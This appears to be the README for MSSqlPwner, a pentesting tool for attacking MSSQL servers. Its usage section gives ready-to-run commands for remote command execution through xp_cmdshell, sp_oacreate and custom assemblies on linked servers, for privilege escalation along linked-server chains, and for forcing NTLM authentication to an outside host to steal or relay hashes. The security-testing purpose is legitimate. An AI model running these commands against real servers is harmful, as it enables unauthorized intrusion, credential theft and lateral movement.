# MSSqlPwner
<p align="center">
 <img src="https://github.com/El3ct71k/MSSqlPwner/blob/main/logo.PNG?raw=true">
</p>
MSSqlPwner is an advanced and versatile pentesting tool designed to seamlessly interact with MSSQL servers and based on Impacket.
The MSSqlPwner tool empowers ethical hackers and security professionals to conduct comprehensive security assessments on MSSQL environments.

With MSSqlPwner, users can execute custom commands through various methods, including custom assembly, `xp_cmdshell`, and `sp_oacreate(Ole Automation Procedures)` and much more. 

The tool starts with recursive enumeration on linked servers and gather all the possible chains.

Also, the MSSqlPwner tool can be used for NTLM relay capabilities, utilizing functions such as xp_dirtree, xp_subdirs, xp_fileexist, and command execution.

Also, this tool provide opportunities for lateral movement assessments and exploration of linked servers.
For example, if the current session does not have administrative privileges, the tool will try to find a chain to escalates its own privileges used linked server.

If the local server does not have permission to execute certain operations, the tool can find a chain to enable execution. 
For example, it can send a query to a linked server that returns back with a link to the local server with higher permissions.
The tool also supports recursive querying via links to execute queries and commands on otherwise inaccessible linked servers.


This tool is supported by multiple authentication methods and described below.

MSSqlPwner is an advanced and versatile pentesting tool designed to seamlessly interact with MSSQL servers and based on Impacket.

The MSSqlPwner tool empowers ethical hackers and security professionals to conduct comprehensive security assessments on MSSQL environments.
## Disclaimer
This tool is designed for security professionals and researchers for testing purposes only and should not be used for illegal purposes.

## Functionalities:
1. Command Execution: Execute commands using the following functions:
- `xp_cmdshell` on local server or on linked servers
- `sp_oacreate` (Ole Automation Procedures) on local server or on linked servers

2. NTLM Hash Stealing and Relay: Issue NTLM relay or steal NTLM hashes using the following functions:
- `xp_dirtree` on local server or on linked servers
- `xp_subdirs` on local server or on linked servers
- `xp_fileexist` on local server or on linked servers

3. Encapsulated Commands and Queries: Execute incapsulated commands or queries using the following options:
- `execute_command` on local server or on linked servers
- `run_query` on local server or on linked servers
- `run_query_system_service` on local server or on linked servers as system user
4. Direct Queries 
- `direct_query` - execute direct queries on local or linked servers as system user.


## Lateral Movement and Chain Exploration:
MSSqlPwner provides opportunities for lateral movement assessments and exploration of linked servers. 
In scenarios where the current session lacks administrative privileges, the tool attempts to find a chain that escalates its own privileges via linked servers. 
If a session on a linked server has higher privileges, the tool can interact with the linked server and perform a linked query back to the host with elevated privileges, enabling lateral movement with the target server.

## Authentication Methods:
Supported by multiple authentication methods, including:
- Windows credentials
- MSSQL credentials
- Kerberos authentication
- Kerberos tickets
- NTLM Hashes

The tool adapts to various scenarios and environments, verifying the effectiveness of authentication mechanisms.

Take your MSSQL environment assessments to the next level with the power and versatility of MSSqlPwner. 
Discover new possibilities for lateral movement, stealthy querying, and precise security evaluations with this the MSSqlPwner tool.

## Installation
```
git clone https://github.com/El3ct71k/MSSqlPwner
cd MSSqlPwner
pip3 install -r requirements.txt
python3 MSSqlPwner.py
```

## Usage
```
# Executing custom assembly on the current server with windows authentication and executing hostname command 
python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth custom-asm hostname

# Executing custom assembly on the current server with windows authentication and executing hostname command on the SRV01 linked server
python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth -link-server SRV01 custom-asm hostname

# Executing the hostname command using stored procedures on the linked SRV01 server
python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth -link-server SRV01 exec hostname

# Executing the hostname command using stored procedures on the linked SRV01 server with sp_oacreate method
python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth -link-server SRV01 exec "cmd /c dir \\\\192.168.45.250\\test" -command-execution-method sp_oacreate

# Issuing NTLM relay attack on the SRV01 server
python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth -link-server SRV01 ntlm-relay \\\\192.168.45.250\\test

# Issuing NTLM relay attack on the local server with custom command
python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay \\\\192.168.45.250\\test

# Executing direct query
python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth direct_query "SELECT CURRENT_USER"
```


## Thanks
- [Kim Dvash](https://www.linkedin.com/in/kim-d-5b3114111) for designing this incredible logo.